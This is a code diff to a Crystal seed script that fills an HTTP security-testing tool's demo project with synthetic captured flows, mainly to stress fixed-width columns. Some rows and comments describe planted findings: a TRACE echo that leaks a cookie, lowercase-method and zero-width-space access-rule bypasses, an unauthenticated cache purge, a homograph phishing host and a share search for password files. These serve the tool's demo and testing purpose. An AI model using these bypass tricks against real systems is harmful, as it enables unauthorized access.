@@ -17,6 +17,14 @@
 # grpc-web / a body cut mid-frame, a gzip'd chunked body, and flows in Pending, Aborted and
 # Error state. See the "Act three" section for the whole list.
 #
+# It also covers every METHOD a real client sends — the eight RFC 9110 registers, the ten
+# WebDAV/DeltaV/DASL adds, and the three a hunter's own tooling puts on the wire — against
+# the hosts, paths, statuses, sizes and durations that stress a fixed-width column: a
+# 15-character verb, a punycode and a homograph host, a double-width path, a right-to-left
+# run, a zero-width space, a body the capture cap cut at 2 KB of 2.5 GB, and a 3.5-hour long
+# poll. That is the "Act five" section, and it exists to be LOOKED AT: a rendering defect in
+# a column is not something a spec can assert, only something a demo can show.
+#
 #   crystal run scripts/seed_demo.cr
 #
 # Re-runnable: it wipes any existing "demo" project first, then recreates it.
@@ -97,6 +105,8 @@ def raw_flow(store : S, created_at : Int64, *,
              h2_conn_id : Int64? = nil, h2_stream_id : Int64? = nil,
              connect_protocol : String? = nil, short_circuited = false,
              state = S::FlowState::Complete, error : String? = nil,
+             resp_body_size : Int64? = nil, resp_truncated = false,
+             advisory : String? = nil,
              source = FS::Kind::Proxy, source_surface : FS::Surface? = nil,
              source_ref : String? = nil) : Int64
   fid = store.insert_flow(S::CapturedRequest.new(
@@ -107,9 +117,14 @@ def raw_flow(store : S, created_at : Int64, *,
     short_circuited: short_circuited, connect_protocol: connect_protocol,
     source: source, source_surface: source_surface, source_ref: source_ref))
 
+  # `resp_body_size` is the TRUE wire size, which is only ever DIFFERENT from the stored
+  # body when the capture cap cut it — that pair (a small blob, a large declared size,
+  # `body_truncated`) is what makes the detail pane draw its "body truncated at capture cap"
+  # banner and the SIZE column report the bytes the origin really sent.
   store.update_response(S::CapturedResponse.new(
     flow_id: fid, status: status, reason: reason, content_type: ctype,
     head: resp_head.to_slice, body: resp_body,
+    body_truncated: resp_truncated, body_size: resp_body_size, advisory: advisory,
     ttfb_us: dur_us // 2, duration_us: dur_us, state: state, error: error))
   fid
 end
@@ -305,7 +320,9 @@ project = registry.create("demo",
   "shop/api/cdn/auth/legacy.demo.test with planted issues; every PROTO the column can print " \
   "(HTTP/2, WS and WSS, GRPC and GRPCS, SSE and SSES, a STUB), incl. an RFC 8441 CONNECT, MQTT " \
   "and graphql-ws sockets, grpc-web and a connect-udp tunnel; GraphQL, SAML and framework-signed " \
-  "cookies; Repeater (incl. a WS and a `$KEY`-bound tab)/" \
+  "cookies; every HTTP method from TRACE and QUERY to WebDAV's PROPFIND/VERSION-CONTROL, " \
+  "with the hosts and paths that stress a fixed-width column (punycode, homograph, RTL, " \
+  "double-width, zero-width, a 2.5 GB truncated body); Repeater (incl. a WS and a `$KEY`-bound tab)/" \
   "Fuzzer/Miner/Sequencer sessions; Rewriter rules + session bindings; project env vars; " \
   "colormarker rules; an OAST listener with callbacks; passive AND active probe findings; " \
   "and entity links tying issues and notes to related workbench items.")
@@ -1799,6 +1816,571 @@ raw_flow(store, t.call(166), host: "partner.demo.test", method: "POST", target: 
 
 store.flush
 puts "• inserted act-four provenance: 2 repeater (tui · mcp), 1 fuzzer, 1 discover, 1 import"
+
+# --- Act five: every METHOD, and the columns themselves ---------------------
+# Acts one through four vary the PROTOCOL and the PROVENANCE. This one varies the two
+# things History renders into a FIXED-WIDTH cell, and therefore the two it can get wrong
+# entirely on its own: the METHOD column (8 cells wide, coloured per verb by
+# `Theme.method_color`) and the HOST / PATH / STA / TYPE / SIZE / DUR strip beside it.
+#
+# It exists to be LOOKED AT, not queried. Traffic that is all GET and POST on
+# `shop.demo.test` never shows what an 8-cell method column does with `VERSION-CONTROL`,
+# what the path column does with a double-width syllable or a right-to-left run, what
+# `fmt_size` prints when the capture cap cut the body, or which colour band a 999 lands in
+# — and each of those is a rendering defect that can only be seen, never asserted in a spec.
+#
+# Every method below is one a real client sends: RFC 9110 registers eight (the six the demo
+# already had, plus TRACE and QUERY), WebDAV/DeltaV/DASL another ten, and the last three are
+# what a hunter's own tooling puts on the wire. Nothing here is invented to fill a column.
+#
+# Timing: act four ended at `t.call(166)` and `base` is now−180m, so there is no room left
+# for a row per minute. These land 15 s apart across the final quarter hour.
+col_t = t.call(167)
+tick = -> { col_t += 15_000_000_i64 }
+
+# ## The two RFC 9110 methods the demo was missing
+#
+# TRACE echoes the request back as `message/http` — cross-site tracing, the reason it is
+# switched off everywhere it is understood. The echo carries the cookie the client never
+# meant to show a script, so the body IS the finding; and `Cookie:` in a RESPONSE body is
+# also the shape the passive scan reads.
+trace_echo = "TRACE / HTTP/1.1\r\nHost: legacy.demo.test:8080\r\nUser-Agent: gori-demo/1.0\r\n" \
+             "Cookie: session=#{flask_cookie}\r\nX-Forwarded-For: 10.0.4.19\r\n" \
+             "X-Original-URL: /admin/dashboard\r\n\r\n"
+add_flow(store, tick.call, scheme: "http", host: "legacy.demo.test", port: 8080,
+  method: "TRACE", target: "/",
+  req_headers: {"Cookie"          => "session=#{flask_cookie}",
+                "X-Forwarded-For" => "10.0.4.19",
+                "X-Original-URL"  => "/admin/dashboard"},
+  status: 200, reason: "OK", ctype: "message/http", resp_body: trace_echo, dur_us: 14_000_i64)
+
+# TRACK is IIS's alias for it, and it is here because it is the one that still answers after
+# somebody "fixed" TRACE: a config line, a WAF rule or a mod_rewrite guard that names TRACE
+# by spelling leaves this open. Same echo, different verb — which is only visible if the
+# METHOD column prints the verb the client actually sent.
+add_flow(store, tick.call, scheme: "http", host: "legacy.demo.test", port: 8080,
+  method: "TRACK", target: "/",
+  req_headers: {"Cookie" => "session=#{flask_cookie}"},
+  status: 200, reason: "OK", ctype: "message/http",
+  resp_body: "TRACK / HTTP/1.1\r\nHost: legacy.demo.test:8080\r\nCookie: session=#{flask_cookie}\r\n\r\n",
+  dur_us: 11_000_i64)
+
+# QUERY (RFC 9110's newest registration): safe and idempotent like GET, but it carries a
+# REQUEST BODY — the shape a search endpoint wants, and one that caches, WAFs and access
+# rules written for "GET has no body, POST is unsafe" have never been pointed at.
+# `Theme.method_color` greens it for exactly that reason, so this row also proves the
+# colour table is reached by something other than GET.
+add_flow(store, tick.call, host: "api.demo.test", method: "QUERY", target: "/v1/search",
+  req_headers: {"Authorization" => "Bearer #{jwt}"},
+  req_body: %({"filter":{"tag":"widget","price":{"lt":3000}},"sort":"price","limit":20}),
+  status: 200, reason: "OK", ctype: "application/json",
+  resp_body: %({"hits":2,"items":[{"id":1000,"sku":"DW-1000","price":999},{"id":1007,"sku":"DW-1007","price":1048}]}),
+  dur_us: 63_000_i64)
+
+# `OPTIONS *` — the server-wide form (RFC 9110 §9.3.7). The request target is not a path and
+# not a URL: it is one asterisk. Every surface that turns a row into a URL (the History path
+# column, Sitemap, the Repeater seed, `Url.origin_path`) has to notice, and a demo without
+# one lets an origin-form assumption survive untested.
+raw_flow(store, tick.call, host: "api.demo.test", method: "OPTIONS", target: "*",
+  req_head: "OPTIONS * HTTP/1.1\r\nHost: api.demo.test\r\nUser-Agent: curl/8.6.0\r\n\r\n",
+  status: 204, reason: "No Content",
+  resp_head: "HTTP/1.1 204 No Content\r\nServer: nginx/1.25.3\r\n" \
+             "Allow: GET, HEAD, POST, PUT, PATCH, DELETE, OPTIONS, QUERY\r\n\r\n",
+  dur_us: 8_000_i64)
+
+# ## WebDAV, DeltaV and DASL — the ten-method half of the registry
+#
+# A file share behind the same auth as everything else. These are not exotica: a `dav.`
+# host is how half the internal document servers on a corporate network answer, the verbs
+# arrive in this exact order from a mounting client, and two of them (`PROPFIND`, `SEARCH`)
+# enumerate paths that no link anywhere points at.
+#
+# The column arithmetic is the point of the set. `PROPFIND` and `CHECKOUT` are exactly 8
+# characters — the cell's full width, which is why the clamp in `render_list` is 8 and not
+# the 7-in-8 its neighbours use. `PROPPATCH` is 9 and `VERSION-CONTROL` is 15, so they are
+# the rows that show what the clamp DOES.
+dav_req = ->(method : String, target : String, extra : String) {
+  String.build do |b|
+    b << method << ' ' << target << " HTTP/1.1\r\n"
+    b << "Host: dav.demo.test\r\nUser-Agent: davfs2/1.6.1 neon/0.32.5\r\n"
+    b << "Authorization: Basic ZGVtbzptZXRyaWNzLXB3\r\n"
+    b << extra << "\r\n"
+  end
+}
+
+dav_resp = ->(status : Int32, reason : String, extra : String, body : String?) {
+  String.build do |b|
+    b << "HTTP/1.1 " << status << ' ' << reason << "\r\n"
+    b << "Server: Apache/2.4.41 (Ubuntu) DAV/2\r\nDate: Thu, 19 Jun 2026 09:00:00 GMT\r\n"
+    b << extra
+    if bd = body
+      b << "Content-Type: application/xml; charset=utf-8\r\nContent-Length: " << bd.bytesize << "\r\n"
+    end
+    b << "\r\n"
+  end
+}
+
+propfind_body = <<-XML
+  <?xml version="1.0" encoding="utf-8"?>
+  <D:propfind xmlns:D="DAV:"><D:allprop/></D:propfind>
+  XML
+
+propfind_xml = <<-XML
+  <?xml version="1.0" encoding="utf-8"?>
+  <D:multistatus xmlns:D="DAV:">
+    <D:response>
+      <D:href>/dav/reports/</D:href>
+      <D:propstat><D:prop><D:displayname>reports</D:displayname>
+        <D:resourcetype><D:collection/></D:resourcetype>
+      </D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat>
+    </D:response>
+    <D:response>
+      <D:href>/dav/reports/q3-forecast-CONFIDENTIAL.docx</D:href>
+      <D:propstat><D:prop><D:getcontentlength>884736</D:getcontentlength>
+        <D:getlastmodified>Wed, 18 Jun 2026 03:00:00 GMT</D:getlastmodified>
+        <D:creator-displayname>bob@demo.test</D:creator-displayname>
+      </D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat>
+    </D:response>
+    <D:response>
+      <D:href>/dav/reports/.svn/wc.db</D:href>
+      <D:propstat><D:prop><D:getcontentlength>131072</D:getcontentlength>
+      </D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat>
+    </D:response>
+  </D:multistatus>
+  XML
+
+raw_flow(store, tick.call, host: "dav.demo.test", method: "PROPFIND", target: "/dav/reports/",
+  req_head: dav_req.call("PROPFIND", "/dav/reports/",
+    "Depth: 1\r\nContent-Type: application/xml\r\nContent-Length: #{propfind_body.bytesize}\r\n"),
+  req_body: propfind_body.to_slice,
+  status: 207, reason: "Multi-Status", ctype: "application/xml; charset=utf-8",
+  resp_head: dav_resp.call(207, "Multi-Status", "", propfind_xml),
+  resp_body: propfind_xml.to_slice, dur_us: 96_000_i64)
+
+proppatch_body = <<-XML
+  <?xml version="1.0" encoding="utf-8"?>
+  <D:propertyupdate xmlns:D="DAV:" xmlns:Z="http://demo.test/ns/">
+    <D:set><D:prop><Z:classification>public</Z:classification></D:prop></D:set>
+  </D:propertyupdate>
+  XML
+proppatch_xml = <<-XML
+  <?xml version="1.0" encoding="utf-8"?>
+  <D:multistatus xmlns:D="DAV:"><D:response>
+    <D:href>/dav/reports/q3-forecast-CONFIDENTIAL.docx</D:href>
+    <D:propstat><D:prop/><D:status>HTTP/1.1 200 OK</D:status></D:propstat>
+  </D:response></D:multistatus>
+  XML
+# 9 characters — one past the cell. The property it rewrites is the document's own
+# classification, which is a write an operator wants to SEE happen.
+raw_flow(store, tick.call, host: "dav.demo.test", method: "PROPPATCH",
+  target: "/dav/reports/q3-forecast-CONFIDENTIAL.docx",
+  req_head: dav_req.call("PROPPATCH", "/dav/reports/q3-forecast-CONFIDENTIAL.docx",
+    "Content-Type: application/xml\r\nContent-Length: #{proppatch_body.bytesize}\r\n"),
+  req_body: proppatch_body.to_slice,
+  status: 207, reason: "Multi-Status", ctype: "application/xml; charset=utf-8",
+  resp_head: dav_resp.call(207, "Multi-Status", "", proppatch_xml),
+  resp_body: proppatch_xml.to_slice, dur_us: 44_000_i64)
+
+raw_flow(store, tick.call, host: "dav.demo.test", method: "MKCOL", target: "/dav/2026-exports/",
+  req_head: dav_req.call("MKCOL", "/dav/2026-exports/", ""),
+  status: 201, reason: "Created",
+  resp_head: dav_resp.call(201, "Created", "Location: https://dav.demo.test/dav/2026-exports/\r\n", nil),
+  dur_us: 27_000_i64)
+
+# COPY / MOVE take their second operand in a HEADER, not the target — so the row's own path
+# tells you only half of what happened, and the detail pane has to be opened for the rest.
+raw_flow(store, tick.call, host: "dav.demo.test", method: "COPY",
+  target: "/dav/reports/q3-forecast-CONFIDENTIAL.docx",
+  req_head: dav_req.call("COPY", "/dav/reports/q3-forecast-CONFIDENTIAL.docx",
+    "Destination: https://dav.demo.test/dav/public/q3.docx\r\nOverwrite: T\r\nDepth: 0\r\n"),
+  status: 201, reason: "Created",
+  resp_head: dav_resp.call(201, "Created", "Location: https://dav.demo.test/dav/public/q3.docx\r\n", nil),
+  dur_us: 118_000_i64)
+
+raw_flow(store, tick.call, host: "dav.demo.test", method: "MOVE", target: "/dav/public/q3.docx",
+  req_head: dav_req.call("MOVE", "/dav/public/q3.docx",
+    "Destination: https://dav.demo.test/dav/public/q3-final.docx\r\nOverwrite: F\r\n"),
+  status: 204, reason: "No Content",
+  resp_head: dav_resp.call(204, "No Content", "", nil), dur_us: 33_000_i64)
+
+lock_body = <<-XML
+  <?xml version="1.0" encoding="utf-8"?>
+  <D:lockinfo xmlns:D="DAV:">
+    <D:lockscope><D:exclusive/></D:lockscope>
+    <D:locktype><D:write/></D:locktype>
+    <D:owner><D:href>mailto:alice@demo.test</D:href></D:owner>
+  </D:lockinfo>
+  XML
+lock_token = "opaquelocktoken:e71d4fae-5dec-22d6-fea5-00a0c91e6be4"
+lock_xml = <<-XML
+  <?xml version="1.0" encoding="utf-8"?>
+  <D:prop xmlns:D="DAV:"><D:lockdiscovery><D:activelock>
+    <D:locktype><D:write/></D:locktype>
+    <D:lockscope><D:exclusive/></D:lockscope>
+    <D:depth>0</D:depth>
+    <D:owner><D:href>mailto:alice@demo.test</D:href></D:owner>
+    <D:timeout>Second-3600</D:timeout>
+    <D:locktoken><D:href>#{lock_token}</D:href></D:locktoken>
+  </D:activelock></D:lockdiscovery></D:prop>
+  XML
+raw_flow(store, tick.call, host: "dav.demo.test", method: "LOCK",
+  target: "/dav/public/q3-final.docx",
+  req_head: dav_req.call("LOCK", "/dav/public/q3-final.docx",
+    "Timeout: Second-3600\r\nContent-Type: application/xml\r\nContent-Length: #{lock_body.bytesize}\r\n"),
+  req_body: lock_body.to_slice,
+  status: 200, reason: "OK", ctype: "application/xml; charset=utf-8",
+  resp_head: dav_resp.call(200, "OK", "Lock-Token: <#{lock_token}>\r\n", lock_xml),
+  resp_body: lock_xml.to_slice, dur_us: 52_000_i64)
+
+# The lock token travels in `Lock-Token:` and nothing else authenticates the release — a
+# guessable token IS the authorization here, which is why the pair of rows is worth having
+# side by side.
+raw_flow(store, tick.call, host: "dav.demo.test", method: "UNLOCK",
+  target: "/dav/public/q3-final.docx",
+  req_head: dav_req.call("UNLOCK", "/dav/public/q3-final.docx", "Lock-Token: <#{lock_token}>\r\n"),
+  status: 204, reason: "No Content",
+  resp_head: dav_resp.call(204, "No Content", "", nil), dur_us: 19_000_i64)
+
+# REPORT (RFC 3253 DeltaV, and every CalDAV/CardDAV client on the planet). The request body
+# names the report; the answer is another multistatus, and this one hands out a colleague's
+# calendar because the ACL was never narrowed past "authenticated".
+report_body = <<-XML
+  <?xml version="1.0" encoding="utf-8"?>
+  <C:calendar-query xmlns:C="urn:ietf:params:xml:ns:caldav" xmlns:D="DAV:">
+    <D:prop><C:calendar-data/></D:prop>
+    <C:filter><C:comp-filter name="VCALENDAR"/></C:filter>
+  </C:calendar-query>
+  XML
+report_xml = <<-XML
+  <?xml version="1.0" encoding="utf-8"?>
+  <D:multistatus xmlns:D="DAV:" xmlns:C="urn:ietf:params:xml:ns:caldav">
+    <D:response><D:href>/dav/calendars/bob/board-2026-06-24.ics</D:href>
+      <D:propstat><D:prop><C:calendar-data>BEGIN:VCALENDAR
+  SUMMARY:Board review — Q3 forecast (do not forward)
+  ATTENDEE:mailto:bob@demo.test
+  END:VCALENDAR</C:calendar-data></D:prop>
+      <D:status>HTTP/1.1 200 OK</D:status></D:propstat>
+    </D:response>
+  </D:multistatus>
+  XML
+raw_flow(store, tick.call, host: "dav.demo.test", method: "REPORT", target: "/dav/calendars/bob/",
+  req_head: dav_req.call("REPORT", "/dav/calendars/bob/",
+    "Depth: 1\r\nContent-Type: application/xml\r\nContent-Length: #{report_body.bytesize}\r\n"),
+  req_body: report_body.to_slice,
+  status: 207, reason: "Multi-Status", ctype: "application/xml; charset=utf-8",
+  resp_head: dav_resp.call(207, "Multi-Status", "", report_xml),
+  resp_body: report_xml.to_slice, dur_us: 88_000_i64)
+
+# SEARCH (RFC 5323 DASL): a query language over the file share, reachable by anyone who can
+# read one file in it. The `where` clause below is the enumeration a PROPFIND crawl would
+# take an hour to do.
+search_body = <<-XML
+  <?xml version="1.0" encoding="utf-8"?>
+  <D:searchrequest xmlns:D="DAV:">
+    <D:basicsearch>
+      <D:select><D:prop><D:getcontentlength/></D:prop></D:select>
+      <D:from><D:scope><D:href>/dav/</D:href><D:depth>infinity</D:depth></D:scope></D:from>
+      <D:where><D:like><D:prop><D:displayname/></D:prop>
+        <D:literal>%password%</D:literal></D:like></D:where>
+    </D:basicsearch>
+  </D:searchrequest>
+  XML
+search_xml = <<-XML
+  <?xml version="1.0" encoding="utf-8"?>
+  <D:multistatus xmlns:D="DAV:">
+    <D:response><D:href>/dav/it/passwords-2026.kdbx</D:href>
+      <D:propstat><D:prop><D:getcontentlength>4096</D:getcontentlength></D:prop>
+      <D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response>
+    <D:response><D:href>/dav/it/wifi-password.txt</D:href>
+      <D:propstat><D:prop><D:getcontentlength>38</D:getcontentlength></D:prop>
+      <D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response>
+  </D:multistatus>
+  XML
+raw_flow(store, tick.call, host: "dav.demo.test", method: "SEARCH", target: "/dav/",
+  req_head: dav_req.call("SEARCH", "/dav/",
+    "Content-Type: application/xml\r\nContent-Length: #{search_body.bytesize}\r\n"),
+  req_body: search_body.to_slice,
+  status: 207, reason: "Multi-Status", ctype: "application/xml; charset=utf-8",
+  resp_head: dav_resp.call(207, "Multi-Status", "", search_xml),
+  resp_body: search_xml.to_slice, dur_us: 1_240_000_i64)
+
+# `VERSION-CONTROL` (RFC 3253) is 15 characters, the longest method in any IANA registry, and
+# the row the METHOD clamp was written for: unclamped it ran straight through PROTO, HOST and
+# into PATH, which is the single most direct way to make the whole list unreadable.
+raw_flow(store, tick.call, host: "dav.demo.test", method: "VERSION-CONTROL",
+  target: "/dav/public/q3-final.docx",
+  req_head: dav_req.call("VERSION-CONTROL", "/dav/public/q3-final.docx", ""),
+  status: 201, reason: "Created",
+  resp_head: dav_resp.call(201, "Created",
+    "Cache-Control: no-cache\r\nLocation: https://dav.demo.test/dav/public/q3-final.docx\r\n", nil),
+  dur_us: 61_000_i64)
+
+# `CHECKOUT`, the other exactly-8 method, and the one that says the clamp is not truncating
+# anything real at that width.
+raw_flow(store, tick.call, host: "dav.demo.test", method: "CHECKOUT",
+  target: "/dav/public/q3-final.docx",
+  req_head: dav_req.call("CHECKOUT", "/dav/public/q3-final.docx", ""),
+  status: 200, reason: "OK",
+  resp_head: dav_resp.call(200, "OK", "Cache-Control: no-cache\r\n", nil), dur_us: 29_000_i64)
+
+# ## The three verbs a hunter's own tooling puts on the wire
+#
+# PURGE is Varnish's, not the IANA registry's — and it is answered here with no credential
+# at all, which is a cache-poisoning primitive rather than a curiosity. The METHOD column
+# greys it (`Theme.method_color`'s `else` branch), which is itself the signal: gori has no
+# opinion about a verb it does not know, and the row still has to be legible.
+add_flow(store, tick.call, host: "cdn.demo.test", method: "PURGE", target: "/assets/app.min.js",
+  status: 200, reason: "Purged", ctype: "text/html",
+  resp_headers: {"X-Cache" => "PURGE from cdn-edge-3"},
+  resp_body: "<html><head><title>200 Purged</title></head><body><h1>Purged</h1></body></html>\n",
+  dur_us: 16_000_i64)
+
+# Lowercase `get`. RFC 9110 §9.1 makes the method case-SENSITIVE, so this is not a GET —
+# and an origin that answers it anyway is the classic way past an access rule written as
+# `if (method == "GET")`. It has to draw as its own row with the case the client sent, not
+# folded into the GETs above, or the demo would be hiding the finding.
+add_flow(store, tick.call, host: "shop.demo.test", method: "get", target: "/admin/dashboard",
+  status: 200, reason: "OK", ctype: "text/html; charset=utf-8",
+  resp_body: html.call("Admin", "<h1>Admin dashboard</h1><p>Signed in as alice.</p>"),
+  dur_us: 37_000_i64)
+
+# A method-fuzz probe: 40 bytes of `A`, which is what a sweep sends to find out whether the
+# parser has a length limit before the router does. This is the worst case the 8-cell clamp
+# will ever see, and `501` is the honest answer the origin gave.
+add_flow(store, tick.call, host: "api.demo.test", method: "A" * 40, target: "/v1/products",
+  status: 501, reason: "Not Implemented", ctype: "text/html",
+  resp_body: "<html><head><title>501 Not Implemented</title></head><body>" \
+             "<center><h1>501 Not Implemented</h1></center><hr><center>nginx/1.25.3</center></body></html>\n",
+  dur_us: 7_000_i64)
+
+# ## The HOST and PATH columns
+#
+# A punycode A-label: `쇼핑몰.한국`, which is what a browser puts in the Host header and
+# therefore what the capture stores. Unreadable as stored, correct as stored — the demo's
+# job is to make sure the column prints it rather than to pretend the problem away.
+add_flow(store, tick.call, host: "xn--352bl7khqr.xn--3e0b707e", target: "/이벤트/여름세일",
+  status: 200, reason: "OK", ctype: "text/html; charset=utf-8",
+  resp_body: html.call("여름 세일", "<h1>여름 세일 — 최대 70%</h1>"), dur_us: 92_000_i64)
+
+# The same host as a U-label, which is what a hand-written client (curl, a script, gori's own
+# Repeater) sends when nobody encoded it. Non-ASCII in the HOST column, so the cell's width
+# arithmetic has to be measuring DISPLAY columns and not bytes or characters — a Hangul
+# syllable is one character, three bytes and two columns wide, and only one of those three
+# numbers lays the column out correctly.
+add_flow(store, tick.call, host: "쇼핑몰.한국", target: "/api/주문/9",
+  req_headers: {"Authorization" => "Bearer #{jwt}"},
+  status: 200, reason: "OK", ctype: "application/json",
+  resp_body: %({"주문번호":9,"상태":"결제완료","금액":3998}), dur_us: 74_000_i64)
+
+# A homograph: the leading character is Cyrillic `ѕ` (U+0455), not Latin `s`. Side by side
+# with `shop.demo.test` in the same list, at the same width, and that is the whole exercise —
+# if the two rows are indistinguishable on screen, so is the phishing origin from the real one.
+add_flow(store, tick.call, host: "ѕhop.demo.test", target: "/login",
+  status: 200, reason: "OK", ctype: "text/html; charset=utf-8",
+  resp_headers: {"Set-Cookie" => "sid=harvested; Path=/"},
+  resp_body: html.call("Demo Shop", "<h1>Sign in</h1><form method=post action=/login>…</form>"),
+  dur_us: 105_000_i64)
+
+# Emoji and a right-to-left run in one path. The emoji is astral-plane (one grapheme, two
+# columns, four bytes) and the Hebrew reverses the visual order of everything after it, so
+# this row is where a column boundary computed from `String#size` shows itself.
+add_flow(store, tick.call, host: "shop.demo.test",
+  target: "/🔥특가/דוח-מכירות-2026.pdf?ref=🦊&q=한글",
+  status: 200, reason: "OK", ctype: "application/pdf",
+  resp_body: "%PDF-1.7\n% demo\n", dur_us: 158_000_i64)
+
+# The percent-encoded spelling of a comparable path — same destination, no wide glyphs, and
+# 90 characters of `%XX` instead. Worth having beside the row above: one is a width problem
+# and the other is a length problem, and a column that handles either can still fail the other.
+add_flow(store, tick.call, host: "shop.demo.test",
+  target: "/%EA%B2%80%EC%83%89?q=%ED%95%9C%EA%B8%80%20%ED%85%8C%EC%8A%A4%ED%8A%B8&sort=%EC%9D%B8%EA%B8%B0%EC%88%9C",
+  status: 200, reason: "OK", ctype: "application/json",
+  resp_body: %({"q":"한글 테스트","sort":"인기순","hits":0}), dur_us: 48_000_i64)
+
+# A zero-width space inside `admin`. Zero columns wide, three bytes long, and it is a real
+# filter bypass: a rule matching the literal string `/admin` does not fire, and a normalising
+# router may route it anyway. On screen the path reads `/a​dmin` — which is the point.
+add_flow(store, tick.call, host: "shop.demo.test", target: "/a\u{200B}dmin/users",
+  status: 200, reason: "OK", ctype: "application/json",
+  resp_body: %([{"id":1,"email":"alice@demo.test","role":"customer"},{"id":2,"email":"bob@demo.test","role":"admin"}]),
+  dur_us: 66_000_i64)
+
+# A long host and a long path at once: a per-tenant hostname of the shape every cloud console
+# hands out, and a signed-URL query string that carries more bytes than the whole rest of the
+# row. Both columns are elastic (they share whatever the fixed cells leave over), so this is
+# the row that says how the leftover space is split when both sides want all of it.
+add_flow(store, tick.call,
+  host: "acme-corporation-staging-eu-central-1.tenants.internal.services.demo.test",
+  target: "/api/v3/organizations/8f3a1c22-4b7e-11ee-be56-0242ac120002/workspaces/marketing-emea/" \
+          "collections/quarterly-reports/items?include=attachments,revisions,acl&fields[item]=id,name,size" \
+          "&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Expires=604800&X-Amz-SignedHeaders=host" \
+          "&X-Amz-Signature=6f1c0e2adf4b91e07c2d5a8f3b6e1d0c9a7f4e2b8d6c1a5f3e9b7d2c4a6f8e0b",
+  req_headers: {"Authorization" => "Bearer #{jwt}"},
+  status: 200, reason: "OK", ctype: "application/json",
+  resp_body: %({"items":[],"page":1,"total":0}), dur_us: 211_000_i64)
+
+# ## The STA, TYPE, SIZE and DUR columns
+#
+# `Theme.status_color` bands the status into four colours and everything outside 200..599
+# falls through to the last one. 999 is not a typo: it is what a bot-defence layer answers
+# with when it has decided you are not a browser, and it is the row that shows which band the
+# fallthrough picked.
+add_flow(store, tick.call, host: "shop.demo.test", target: "/search?q=widget",
+  req_headers: {"User-Agent" => "python-requests/2.31.0"},
+  status: 999, reason: "Request Denied", ctype: "text/html",
+  resp_headers: {"X-Bot-Defense" => "challenge-failed"},
+  resp_body: html.call("Denied", "<h1>Request denied</h1><p>Automated traffic.</p>"),
+  dur_us: 24_000_i64)
+
+# 206 with a `Content-Range`: a range request is how every video player and every resumed
+# download talks, and the SIZE column here reports the SLICE, not the file.
+raw_flow(store, tick.call, host: "cdn.demo.test", method: "GET", target: "/media/demo-clip.mp4",
+  req_head: "GET /media/demo-clip.mp4 HTTP/1.1\r\nHost: cdn.demo.test\r\nUser-Agent: gori-demo/1.0\r\n" \
+            "Range: bytes=0-1023\r\nAccept: video/*\r\n\r\n",
+  status: 206, reason: "Partial Content", ctype: "video/mp4",
+  resp_head: "HTTP/1.1 206 Partial Content\r\nServer: nginx/1.25.3\r\nContent-Type: video/mp4\r\n" \
+             "Content-Range: bytes 0-1023/48219044\r\nContent-Length: 1024\r\nAccept-Ranges: bytes\r\n\r\n",
+  resp_body: Bytes.new(1024) { |i| (i % 251).to_u8 }, dur_us: 71_000_i64)
+
+# 307, which is the redirect that PRESERVES the method and body — a POST redirected here is
+# re-POSTed to the new origin, credentials and all, and that is a different fact from the 301
+# and 302 rows above.
+add_flow(store, tick.call, host: "api.demo.test", method: "POST", target: "/v1/legacy/checkout",
+  req_headers: {"Authorization" => "Bearer #{jwt}"},
+  req_body: %({"cart_id":9,"pay":"card"}),
+  status: 307, reason: "Temporary Redirect",
+  resp_headers: {"Location" => "https://payments.partner.demo.test/v2/checkout"},
+  dur_us: 21_000_i64)
+
+# 405 with an `Allow` header — the answer that tells a hunter which verbs to try next, and
+# the reason the METHOD column is worth reading at all.
+add_flow(store, tick.call, host: "api.demo.test", method: "DELETE", target: "/v1/products/1000",
+  req_headers: {"Authorization" => "Bearer #{jwt}"},
+  status: 405, reason: "Method Not Allowed", ctype: "application/json",
+  resp_headers: {"Allow" => "GET, HEAD, PUT, PATCH, OPTIONS, QUERY"},
+  resp_body: %({"error":"method_not_allowed","allow":["GET","HEAD","PUT","PATCH","OPTIONS","QUERY"]}),
+  dur_us: 13_000_i64)
+
+# 417 answering an `Expect: 100-continue` — the handshake where the client WITHHOLDS its body
+# until the origin agrees (#728). The request head declares 8 MB of body and the flow carries
+# none, because none was ever sent.
+raw_flow(store, tick.call, host: "api.demo.test", method: "PUT", target: "/v1/imports/catalog.csv",
+  req_head: "PUT /v1/imports/catalog.csv HTTP/1.1\r\nHost: api.demo.test\r\nUser-Agent: curl/8.6.0\r\n" \
+            "Authorization: Bearer #{jwt}\r\nExpect: 100-continue\r\nContent-Type: text/csv\r\n" \
+            "Content-Length: 8388608\r\n\r\n",
+  status: 417, reason: "Expectation Failed", ctype: "text/plain",
+  resp_head: "HTTP/1.1 417 Expectation Failed\r\nServer: nginx/1.25.3\r\nContent-Type: text/plain\r\n" \
+             "Content-Length: 38\r\nConnection: close\r\n\r\n",
+  resp_body: "upload exceeds the 4 MiB body limit\n".to_slice, dur_us: 340_000_i64)
+
+# 451, which names the authority in a `Link` header rather than in prose, and 429 already has
+# a row — so this is the compliance-shaped refusal the demo was missing.
+add_flow(store, tick.call, host: "shop.demo.test", target: "/products/1042",
+  status: 451, reason: "Unavailable For Legal Reasons", ctype: "text/html",
+  resp_headers: {"Link" => "<https://legal.demo.test/orders/2026-114>; rel=\"blocked-by\""},
+  resp_body: html.call("Unavailable", "<h1>Unavailable for legal reasons</h1>"),
+  dur_us: 18_000_i64)
+
+# 418, because a real API framework really does ship it as its "you sent nonsense" default,
+# and a reason phrase can be anything the origin likes — this one is long enough to test what
+# the detail pane does with a status line that will not fit.
+add_flow(store, tick.call, host: "api.demo.test", method: "POST", target: "/v1/cart/items",
+  req_headers: {"Authorization" => "Bearer #{jwt}"}, req_body: %({"sku":null,"qty":-1}),
+  status: 418, reason: "I'm a teapot — the request body failed schema validation at $.qty (expected an integer >= 1, got -1)",
+  ctype: "application/problem+json",
+  resp_body: %({"type":"https://demo.test/errors/validation","title":"Invalid item","status":418,"detail":"qty must be >= 1","instance":"/v1/cart/items"}),
+  dur_us: 26_000_i64)
+
+# A body the capture cap CUT. `body_size` is the true wire size (2.5 GB) and the stored blob
+# is the first 2 KB, which is exactly the pair the detail pane's "body truncated at capture
+# cap, N of M bytes" banner is computed from — and the only way to see that banner without
